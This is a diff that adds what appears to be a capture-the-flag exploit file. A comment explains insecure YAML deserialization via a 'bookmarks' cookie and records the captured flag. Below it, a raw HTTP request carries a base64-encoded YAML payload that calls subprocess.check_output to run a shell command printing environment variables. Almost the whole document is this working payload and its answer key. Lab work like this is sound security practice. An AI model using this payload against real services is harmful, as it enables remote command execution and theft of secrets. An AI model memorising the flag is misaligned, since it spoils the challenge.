@@ -1,0 +1,5 @@
+# Insecure YAML deserialization via bookmarks cookie. Payload: YAML list with !!python/object/apply:subprocess.check_output executing OS commands. The name field in the template renders the command output, leaking FLAG env var: flag{ed791869-404b-453f-bf8e-86a09040af65}
+
+GET /list HTTP/1.1
+Host: 172.17.0.1:39995
+Cookie: bookmarks=LSBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIC0gWy9iaW4vc2gsIC1jLCBlbnZdCiAgdXJsOiBodHRwOi8vMTcyLjE3LjAuMTozOTk5NS8K
